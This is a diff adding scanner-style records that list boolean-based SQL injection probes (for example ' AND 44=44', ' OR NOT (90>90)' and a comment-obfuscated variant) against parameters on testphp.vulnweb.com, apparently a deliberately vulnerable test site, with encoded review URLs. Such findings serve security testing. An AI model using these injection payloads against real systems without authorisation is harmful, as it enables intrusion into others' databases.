@@ -1,0 +1,258 @@
+{
+    "type": "SQLi",
+    "url": "http://testphp.vulnweb.com/listproducts.php?cat=",
+    "payload": " AND 44=44",
+    "Review": "http://testphp.vulnweb.com/listproducts.php?cat=%20AND%2044%3D44"
+},
+{
+    "type": "SQLi",
+    "url": "http://testphp.vulnweb.com/listproducts.php?cat=",
+    "payload": " AND 44=44#",
+    "Review": "http://testphp.vulnweb.com/listproducts.php?cat=%20AND%2044%3D44%23"
+},
+{
+    "type": "SQLi",
+    "url": "http://testphp.vulnweb.com/listproducts.php?cat=",
+    "payload": " OR NOT (44>44)",
+    "Review": "http://testphp.vulnweb.com/listproducts.php?cat=%20OR%20NOT%20%2844%3E44%29"
+},
+{
+    "type": "SQLi",
+    "url": "http://testphp.vulnweb.com/listproducts.php?cat=",
+    "payload": " OR NOT (44>44)",
+    "Review": "http://testphp.vulnweb.com/listproducts.php?cat=%20OR%20NOT%20%2844%3E44%29"
+},
+{
+    "type": "SQLi",
+    "url": "http://testphp.vulnweb.com/product.php?pic=",
+    "payload": " AND 44=44",
+    "Review": "http://testphp.vulnweb.com/product.php?pic=%20AND%2044%3D44"
+},
+{
+    "type": "SQLi",
+    "url": "http://testphp.vulnweb.com/artists.php?artist=",
+    "payload": " AND 44=44",
+    "Review": "http://testphp.vulnweb.com/artists.php?artist=%20AND%2044%3D44"
+},
+{
+    "type": "SQLi",
+    "url": "http://testphp.vulnweb.com/product.php?pic=",
+    "payload": " AND 44=44",
+    "Review": "http://testphp.vulnweb.com/product.php?pic=%20AND%2044%3D44"
+},
+{
+    "type": "SQLi",
+    "url": "http://testphp.vulnweb.com/product.php?pic=",
+    "payload": " AND 44=44",
+    "Review": "http://testphp.vulnweb.com/product.php?pic=%20AND%2044%3D44"
+},
+{
+    "type": "SQLi",
+    "url": "http://testphp.vulnweb.com/product.php?pic=",
+    "payload": " AND 44=44",
+    "Review": "http://testphp.vulnweb.com/product.php?pic=%20AND%2044%3D44"
+},
+{
+    "type": "SQLi",
+    "url": "http://testphp.vulnweb.com/product.php?pic=",
+    "payload": " AND 44=44",
+    "Review": "http://testphp.vulnweb.com/product.php?pic=%20AND%2044%3D44"
+},
+{
+    "type": "SQLi",
+    "url": "http://testphp.vulnweb.com/product.php?pic=",
+    "payload": " OR NOT (44>44)",
+    "Review": "http://testphp.vulnweb.com/product.php?pic=%20OR%20NOT%20%2844%3E44%29"
+},
+{
+    "type": "SQLi",
+    "url": "http://testphp.vulnweb.com/artists.php?artist=",
+    "payload": " AND 44=44",
+    "Review": "http://testphp.vulnweb.com/artists.php?artist=%20AND%2044%3D44"
+},
+{
+    "type": "SQLi",
+    "url": "http://testphp.vulnweb.com/product.php?pic=",
+    "payload": " AND 44=44",
+    "Review": "http://testphp.vulnweb.com/product.php?pic=%20AND%2044%3D44"
+},
+{
+    "type": "SQLi",
+    "url": "http://testphp.vulnweb.com/artists.php?artist=",
+    "payload": " AND 44=44",
+    "Review": "http://testphp.vulnweb.com/artists.php?artist=%20AND%2044%3D44"
+},
+{
+    "type": "SQLi",
+    "url": "http://testphp.vulnweb.com/listproducts.php?artist=",
+    "payload": " OR NOT (44>44)",
+    "Review": "http://testphp.vulnweb.com/listproducts.php?artist=%20OR%20NOT%20%2844%3E44%29"
+},
+{
+    "type": "SQLi",
+    "url": "http://testphp.vulnweb.com/listproducts.php?cat=",
+    "payload": " AND 90=90",
+    "Review": "http://testphp.vulnweb.com/listproducts.php?cat=%20AND%2090%3D90"
+},
+{
+    "type": "SQLi",
+    "url": "http://testphp.vulnweb.com/listproducts.php?cat=",
+    "payload": " OR NOT (90>90)",
+    "Review": "http://testphp.vulnweb.com/listproducts.php?cat=%20OR%20NOT%20%2890%3E90%29"
+},
+{
+    "type": "SQLi",
+    "url": "http://testphp.vulnweb.com/listproducts.php?cat=",
+    "payload": " OR NOT (90>90)",
+    "Review": "http://testphp.vulnweb.com/listproducts.php?cat=%20OR%20NOT%20%2890%3E90%29"
+},
+{
+    "type": "SQLi",
+    "url": "http://testphp.vulnweb.com/listproducts.php?cat=",
+    "payload": " OR NOT (90>90)",
+    "Review": "http://testphp.vulnweb.com/listproducts.php?cat=%20OR%20NOT%20%2890%3E90%29"
+},
+{
+    "type": "SQLi",
+    "url": "http://testphp.vulnweb.com/product.php?pic=",
+    "payload": " AND 90=90",
+    "Review": "http://testphp.vulnweb.com/product.php?pic=%20AND%2090%3D90"
+},
+{
+    "type": "SQLi",
+    "url": "http://testphp.vulnweb.com/artists.php?artist=",
+    "payload": " AND 90=90",
+    "Review": "http://testphp.vulnweb.com/artists.php?artist=%20AND%2090%3D90"
+},
+{
+    "type": "SQLi",
+    "url": "http://testphp.vulnweb.com/product.php?pic=",
+    "payload": " AND 90=90",
+    "Review": "http://testphp.vulnweb.com/product.php?pic=%20AND%2090%3D90"
+},
+{
+    "type": "SQLi",
+    "url": "http://testphp.vulnweb.com/product.php?pic=",
+    "payload": " AND 90=90",
+    "Review": "http://testphp.vulnweb.com/product.php?pic=%20AND%2090%3D90"
+},
+{
+    "type": "SQLi",
+    "url": "http://testphp.vulnweb.com/product.php?pic=",
+    "payload": " AND 90=90",
+    "Review": "http://testphp.vulnweb.com/product.php?pic=%20AND%2090%3D90"
+},
+{
+    "type": "SQLi",
+    "url": "http://testphp.vulnweb.com/product.php?pic=",
+    "payload": " AND 90=90",
+    "Review": "http://testphp.vulnweb.com/product.php?pic=%20AND%2090%3D90"
+},
+{
+    "type": "SQLi",
+    "url": "http://testphp.vulnweb.com/product.php?pic=",
+    "payload": " OR NOT (90>90)",
+    "Review": "http://testphp.vulnweb.com/product.php?pic=%20OR%20NOT%20%2890%3E90%29"
+},
+{
+    "type": "SQLi",
+    "url": "http://testphp.vulnweb.com/artists.php?artist=",
+    "payload": " AND 90=90",
+    "Review": "http://testphp.vulnweb.com/artists.php?artist=%20AND%2090%3D90"
+},
+{
+    "type": "SQLi",
+    "url": "http://testphp.vulnweb.com/product.php?pic=",
+    "payload": " AND 90=90",
+    "Review": "http://testphp.vulnweb.com/product.php?pic=%20AND%2090%3D90"
+},
+{
+    "type": "SQLi",
+    "url": "http://testphp.vulnweb.com/artists.php?artist=",
+    "payload": " AND 90=90",
+    "Review": "http://testphp.vulnweb.com/artists.php?artist=%20AND%2090%3D90"
+},
+{
+    "type": "SQLi",
+    "url": "http://testphp.vulnweb.com/listproducts.php?artist=",
+    "payload": " OR NOT (90>90)",
+    "Review": "http://testphp.vulnweb.com/listproducts.php?artist=%20OR%20NOT%20%2890%3E90%29"
+},
+{
+    "type": "SQLi",
+    "url": "http://testphp.vulnweb.com/listproducts.php?cat=",
+    "payload": " AND 122=122",
+    "Review": "http://testphp.vulnweb.com/listproducts.php?cat=%20AND%20122%3D122"
+},
+{
+    "type": "SQLi",
+    "url": "http://testphp.vulnweb.com/listproducts.php?cat=",
+    "payload": " OR NOT (122>122)",
+    "Review": "http://testphp.vulnweb.com/listproducts.php?cat=%20OR%20NOT%20%28122%3E122%29"
+},
+{
+    "type": "SQLi",
+    "url": "http://testphp.vulnweb.com/listproducts.php?cat=",
+    "payload": " OR NOT (122>122)",
+    "Review": "http://testphp.vulnweb.com/listproducts.php?cat=%20OR%20NOT%20%28122%3E122%29"
+},
+{
+    "type": "SQLi",
+    "url": "http://testphp.vulnweb.com/artists.php?artist=",
+    "payload": " AND 122=122",
+    "Review": "http://testphp.vulnweb.com/artists.php?artist=%20AND%20122%3D122"
+},
+{
+    "type": "SQLi",
+    "url": "http://testphp.vulnweb.com/product.php?pic=",
+    "payload": " AND 122=122",
+    "Review": "http://testphp.vulnweb.com/product.php?pic=%20AND%20122%3D122"
+},
+{
+    "type": "SQLi",
+    "url": "http://testphp.vulnweb.com/product.php?pic=",
+    "payload": " AND 122=122",
+    "Review": "http://testphp.vulnweb.com/product.php?pic=%20AND%20122%3D122"
+},
+{
+    "type": "SQLi",
+    "url": "http://testphp.vulnweb.com/product.php?pic=",
+    "payload": " AND 122=122",
+    "Review": "http://testphp.vulnweb.com/product.php?pic=%20AND%20122%3D122"
+},
+{
+    "type": "SQLi",
+    "url": "http://testphp.vulnweb.com/product.php?pic=",
+    "payload": " AND 122=122",
+    "Review": "http://testphp.vulnweb.com/product.php?pic=%20AND%20122%3D122"
+},
+{
+    "type": "SQLi",
+    "url": "http://testphp.vulnweb.com/product.php?pic=",
+    "payload": " OR NOT (122>122)",
+    "Review": "http://testphp.vulnweb.com/product.php?pic=%20OR%20NOT%20%28122%3E122%29"
+},
+{
+    "type": "SQLi",
+    "url": "http://testphp.vulnweb.com/artists.php?artist=",
+    "payload": " AND 122=122",
+    "Review": "http://testphp.vulnweb.com/artists.php?artist=%20AND%20122%3D122"
+},
+{
+    "type": "SQLi",
+    "url": "http://testphp.vulnweb.com/product.php?pic=",
+    "payload": " AND 122=122",
+    "Review": "http://testphp.vulnweb.com/product.php?pic=%20AND%20122%3D122"
+},
+{
+    "type": "SQLi",
+    "url": "http://testphp.vulnweb.com/artists.php?artist=",
+    "payload": " AND 122=122",
+    "Review": "http://testphp.vulnweb.com/artists.php?artist=%20AND%20122%3D122"
+},
+{
+    "type": "SQLi",
+    "url": "http://testphp.vulnweb.com/listproducts.php?artist=",
+    "payload": "/**/AND/**/122=122#",
+    "Review": "http://testphp.vulnweb.com/listproducts.php?artist=%2F%2A%2A%2FAND%2F%2A%2A%2F122%3D122%23"
+},
